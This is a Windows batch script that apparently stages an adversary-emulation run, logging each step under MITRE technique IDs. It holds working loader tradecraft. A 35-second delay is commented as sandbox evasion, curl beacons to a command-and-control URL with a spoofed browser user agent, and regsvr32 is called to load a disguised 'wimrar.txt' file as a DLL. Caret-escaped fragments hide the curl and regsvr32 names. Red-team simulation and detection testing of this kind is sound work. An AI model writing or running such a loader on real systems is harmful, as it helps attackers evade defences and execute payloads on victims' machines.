@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8011\90813b29
SET fpakbq=Macula-Stage0-8011
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8011-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=wimrar.txt
SET fpldhe=8011

REM Log file path using PHR_ variable
SET lhruwn=%APPDATA%\!yydue!\macula-simulations.log

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\!yydue!\" (
    mkdir "%APPDATA%\!yydue!\" >nul 2>nul
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: create_log_dir=%APPDATA%\!yydue!>> "!lhruwn!" 2>nul
)

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=initial_35s>> "!lhruwn!" 2>nul
timeout /t 35 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=initial_35s>> "!lhruwn!" 2>nul

REM 1. CORRECTED C2 heartbeat implementation
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start=!rdzgrnne!>> "!lhruwn!" 2>nul

REM Light obfuscation for curl binary only
SET c1=c^
SET c2=u^
SET c3=r^
SET c4=l

REM Check if curl exists
where !c1!!c2!!c3!!c4! >nul 2>&1
IF NOT !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: curl_not_found>> "!lhruwn!" 2>nul
    SET hbres=0
    SET hberr=curl_not_available
    GOTO :heartbeat_complete
)

REM Execute curl with proper flags and error handling
!c1!!c2!!c3!!c4! -k -s -o nul -X GET -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "!rdzgrnne!" 2>nul
SET rc1=!ERRORLEVEL!

IF !rc1! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_success=!rdzgrnne!>> "!lhruwn!" 2>nul
    SET hbres=1
    SET hberr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_failed=error_!rc1!>> "!lhruwn!" 2>nul
    SET hbres=0
    SET hberr=connection_failed_!rc1!
)

:heartbeat_complete
REM TTP logging for successful/failed heartbeat
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000
SET ttp_line=[!log_timestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!hbres!:!hberr!
echo !ttp_line!>> "!lhruwn!" 2>nul || echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_log_failed>> nul 2>nul

REM Random delay between operations
SET /A rdelay=!RANDOM! %% 12 + 8
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=random_!rdelay!s>> "!lhruwn!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=random_!rdelay!s>> "!lhruwn!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!lhruwn!" 2>nul
cd /d "!yktnwwf!" >nul 2>nul
SET rc2=!ERRORLEVEL!

IF !rc2! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_success=!yktnwwf!>> "!lhruwn!" 2>nul
    SET cdres=1
    SET cderr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_failed=error_!rc2!>> "!lhruwn!" 2>nul
    SET cdres=0
    SET cderr=path_not_found
)

REM Short delay before execution
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=pre_exec_8s>> "!lhruwn!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=pre_exec_8s>> "!lhruwn!" 2>nul

REM 3. Execute DLL with obfuscated Regsvr32
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_start=!edjwtl!>> "!lhruwn!" 2>nul

REM Obfuscate regsvr32 with heavy caret escapes
SET w1=%^
SET w2=S^
SET w3=y^
SET w4=s^
SET w5=t^
SET w6=e^
SET w7=m^
SET w8=R^
SET w9=o^
SET w10=o^
SET w11=t^
SET w12=%^
SET w13=\^
SET w14=S^
SET w15=y^
SET w16=s^
SET w17=t^
SET w18=e^
SET w19=m^
SET w20=3^
SET w21=2^
SET w22=\^
SET r1=R^
SET r2=e^
SET r3=g^
SET r4=s^
SET r5=v^
SET r6=r^
SET r7=3^
SET r8=2^
SET e1=.^
SET e2=e^
SET e3=x^
SET e4=e
SET s1=/^
SET s2=s

!w1!!w2!!w3!!w4!!w5!!w6!!w7!!w8!!w9!!w10!!w11!!w12!!w13!!w14!!w15!!w16!!w17!!w18!!w19!!w20!!w21!!w22!!r1!!r2!!r3!!r4!!r5!!r6!!r7!!r8!!e1!!e2!!e3!!e4% !s1!!s2% "!edjwtl!"
SET rc3=!ERRORLEVEL!

IF !rc3! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_success=!edjwtl!>> "!lhruwn!" 2>nul
    SET dlres=1
    SET dlerr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_failed=error_!rc3!>> "!lhruwn!" 2>nul
    SET dlres=0
    SET dlerr=regsvr32_failed
)

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=final_10s>> "!lhruwn!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=final_10s>> "!lhruwn!" 2>nul

REM TTP Logging for T1218 - Signed Binary Proxy Execution
SET ttp_result=!dlres!
SET ttp_error=!dlerr!
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000
SET ttp_line=[!log_timestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!
echo !ttp_line!>> "!lhruwn!" 2>nul || echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_log_failed>> nul 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_complete>> "!lhruwn!" 2>nul
ENDLOCAL